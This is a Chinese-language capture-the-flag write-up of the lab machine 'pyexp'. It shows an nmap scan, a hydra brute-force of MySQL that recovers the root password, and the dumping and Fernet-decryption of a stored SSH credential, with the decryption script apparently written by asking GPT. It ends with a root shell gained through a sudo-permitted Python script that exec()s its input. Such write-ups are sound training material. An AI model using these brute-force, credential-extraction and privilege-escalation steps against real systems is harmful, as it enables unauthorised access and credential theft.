# pyexp

```
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.195.118    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 11:10 CST
Nmap scan report for 192.168.195.118
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7af6cd12694dce51a221a644e1c34a9 (RSA)
|   256 46d28dbd2f9eafcee2455ca612c0d919 (ECDSA)
|_  256 8d11edff7dc5a72499227fce2988b24a (ED25519)
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1
|   Thread ID: 39
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, InteractiveClient, IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, IgnoreSigpipes, SupportsLoadDataLocal, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: =|{v_UnKkY[=^@gdB\)T
|_  Auth Plugin Name: mysql_native_password
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/21%OT=1337%CT=1%CU=30941%PV=Y%DS=4%DC=T%G=Y%TM=64698
OS:BD4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%II=I%TS=A)OPS(O1
OS:=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW
OS:7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=
OS:Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R
OS:D=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
OS:9289%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   259.85 ms 192.168.45.1
2   259.87 ms 192.168.45.254
3   261.28 ms 192.168.251.1
4   261.43 ms 192.168.195.118

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.99 seconds

```

```
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.195.118
```

爆破出mysql的密码root:prettywoman

```
mysql -h 192.168.195.118 -u root -p
prettywoman
```

```
MariaDB [data]> select * from fernet;
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+

```

参考了一下资料，使用了fetnet模块进行加密，问问gpt解密脚本怎么写

```
from cryptography.fernet import Fernet

# 加密后的密文和 key（这里只是示例，请替换为自己的实际值）
encrypted_message = b'gAAAAABd7sR0...liMBiH07v8='
key = b'eJdYD9jHjJTZVVo...K0wE='

# 创建 Fernet 对象并使用 key 进行解密
f = Fernet(key)
decrypted_message = f.decrypt(encrypted_message)

# 打印解密后的明文
print(decrypted_message.decode())
```

获得明文lucy:wJ9`"Lemdv9[FEw-

```
ssh lucy@192.168.195.118 -p 1337
wJ9`"Lemdv9[FEw-
```

提权，看看sudo -l

```
lucy@pyexp:~$ sudo -l
Matching Defaults entries for lucy on pyexp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py

```

```
lucy@pyexp:~$ cat /opt/exp.py
uinput = raw_input('how are you?')
exec(uinput)

```

终于遇到个能看懂的了

exec()函数会把参数作为python代码执行，通过raw_input()输入

```
import pty; pty.spawn ("/bin/bash")
```




